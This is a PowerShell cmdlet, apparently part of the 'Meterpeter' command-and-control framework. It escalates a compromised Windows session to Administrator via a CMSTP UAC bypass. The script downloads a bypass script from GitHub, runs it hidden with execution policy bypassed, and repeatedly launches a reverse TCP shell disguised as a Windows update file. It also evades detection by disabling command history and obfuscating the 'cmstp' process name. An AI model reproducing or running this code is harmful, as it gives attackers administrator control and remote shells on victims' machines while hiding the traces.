<#
.SYNOPSIS
   CmdLet to loop UACBypassCMSTP.ps1 execution!

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: UACBypassCMSTP.ps1 {auto}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.1.5

.DESCRIPTION
   This cmdlet its a module of @Meterpeter C2 v2.10.11.15 release, that allow 
   meterpeter users to elevate session shell privileges from UserLand to Admin. 

.NOTES
   By default it downloads\executes 'UACBypassCMSTP.ps1' from %TMP% directory,
   that for is turn executes the reverse tcp shell ( only PS1 scripts ) from
   sellected location. That location can be set using -RatLocation parameter.

.Parameter DelayTime
   Seconds to delay UACBypassCMSTP.ps1 execution (default: 30)

.Parameter LoopFor
   How Many times do we execute the loop function? (default: 2)

.Parameter RatLocation
   Path of script to exec (default: $Env:TMP\Update-KB5005101.ps1)

.EXAMPLE
   PS C:\> .\CMSTPTrigger.ps1 -DelayTime "60"
   Execute 'UACBypassCMSTP.ps1' after 60 seconds.

.EXAMPLE
   PS C:\> .\CMSTPTrigger.ps1 -DelayTime "60" -LoopFor "5"
   Execute UACBypassCMSTP.ps1 at each '60' seconds, a max of '5' times.

.EXAMPLE
   PS C:\> .\CMSTPTrigger.ps1 -DelayTime "10" -LoopFor "3" -RatLocation "$Env:USERPROFILE\Desktop\rat.ps1"
   Execute UACBypassCMSTP.ps1 at each '10' seconds that exec -RatLocation '<string'>, a max of '3' times.

.OUTPUTS
   * Elevate session from UserLand to Administrator!
      => Download: UACBypassCMSTP from GitHub into %TMP% ..

   MaxExec  DelayTime  RatLocation
   -------  ---------  -------------
   2        30(sec)    C:\Users\pedro\AppData\Local\Temp\Update-KB5005101.ps1

   * Exit @meterpeter and start a new handler to recive the elevated shell.
     => Remenber: To manual delete artifacts from 'TMP' dir after escalation.
   
.LINK
   https://oddvar.moe/2017/08/15/research-on-cmstp-exe
   https://github.com/r00t-3xp10it/redpill/blob/main/bypass/UACBypassCMSTP.ps1
   https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/CMSTPTrigger.ps1
#>


 [CmdletBinding(PositionalBinding=$false)] param(
   [string]$RatLocation="False",
   [int]$DelayTime="30",
   [int]$LoopFor="2"
)


$TryFor = $LoopFor+1
$FailedExecution = "False"
$GostavasDeSaber = "@m_tp"
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$NoStringsForYou = ($GostavasDeSaber).Replace("@","c").Replace("_","s")
Write-Host "* Elevate session from UserLand to Administrator!" -ForegroundColor Green

If(-not(Test-Path -Path "$Env:TMP\UACBypassCMSTP.ps1"))
{
   #Download CmdLet from my GitHub repository into %tmp% directory.
   Write-Host "  => Downloading: UACBypassCMSTP from GitHub into %TMP% .." -ForeGroundColor Blue
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/UACBypassCMSTP.ps1" -OutFile "$Env:TMP\UACBypassCMSTP.ps1"|Out-Null
}

If($RatLocation -ne "False")
{
   If($RatLocation -iNotMatch '(.ps1)$')
   {
      $RatLocation = "$Env:TMP\Update-KB5005101.ps1"
      Write-Host "  => Error: This function only accepts .PS1 scripts .." -ForegroundColor Red -BackgroundColor Black
      Write-Host "     => Using default value: `$Env:TMP\Update-KB5005101.ps1`n" -ForegroundColor Blue  
   }
   Else
   {
      #Replace RatLocation on UACBypassCMSTP cmdlet?
      ((Get-Content -Path "$Env:TMP\UACBypassCMSTP.ps1" -Raw) -Replace '\$Env:TMP\\Update-KB5005101.ps1',"$RatLocation")|Set-Content -Path "$Env:TMP\UACBypassCMSTP.ps1"
   }
}
Else
{
   #Use default RatLocation Parameter declaration.
   $RatLocation = "$Env:TMP\Update-KB5005101.ps1"
}


for($i=1; $i -lt $TryFor; $i++)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - For() function to loop for sellected amount of times.

   .NOTES
      The UACBypassCMSTP.ps1 CmdLet executes Update-KB50005101.ps1
      reverse tcp shell each time that loops, with sellected time delay.
      CmdLet will check cm`stp process state and CorpVpn network adapter
      profile, before each loop exec to prevent adapter gui from pop up. 
   #>

   try{

      Start-Sleep -Seconds $DelayTime
      #Make sure cms`tp process its not runing!
      If((Get-Process -Name $NoStringsForYou -EA silentlycontinue).Responding -Match '^(True)$')
      {
         Stop-Process -Name $NoStringsForYou -Force
         Start-Sleep -Milliseconds 1500
      }

      #Make sure CorpVpn network adapter profile its not active!
      $CorpVpnAdapterState = Get-NetAdapter | ? { $_.Name -like "*CorpVpn*" }
      If(-not($CorpVpnAdapterState) -or $CorpVpnAdapterState -ieq $null)
      {
         #Make sure we dont have a session allready open before exec EOP again!
         $readLog = Get-Content -Path "$Env:TMP\EOPsettings.log" -EA SilentlyContinue
         If(-not($readLog) -or $readLog -ieq $null)
         {
            $ShellConnection = $null
         }
         Else
         {
            $ShellConnection = netstat -ano|Findstr /C:"$readLog"
         }

         If(-not($ShellConnection) -or $ShellConnection -ieq $null)
         {
            #Execute EOP script without rebooting!
            powershell -exec bypass -WindowStyle hidden -File "$Env:TMP\UACBypassCMSTP.ps1"
         }
      }

   }catch{$FailedExecution = "True"
      Write-Host "[x] Error: fail to execute '$Env:TMP\UACBypassCMSTP.ps1' (EOP)" -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";exit #Exit @CMSTPTrigger
   }

}


#Build output DataTable!
$mytable = New-Object System.Data.DataTable
$mytable.Columns.Add("MaxExec")|Out-Null
$mytable.Columns.Add("DelayTime")|Out-Null
$mytable.Columns.Add("RatLocation")|Out-Null

#Adding values to DataTable!
$mytable.Rows.Add("$LoopFor",         ## max eop executions
                  "$DelayTime(sec)",  ## Looop each <int> seconds
                  "$RatLocation"      ## rat client absoluct path
)|Out-Null

#Diplay output DataTable!
$mytable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
   $stringformat = If($_ -Match '^(MaxExec)'){
      @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
   Write-Host @stringformat $_
}


#Final stdout displays
If($FailedExecution -ieq "False")
{
   Write-Host "* Exit @Meterpeter and start a new handler to recive the elevated shell." -ForegroundColor Green
   Write-Host "  => Remenber: To manual delete artifacts from 'TMP' dir after escalation.`n" -ForegroundColor Blue
   Remove-Item -Path "$Env:TMP\EOPsettings.log" -Force
}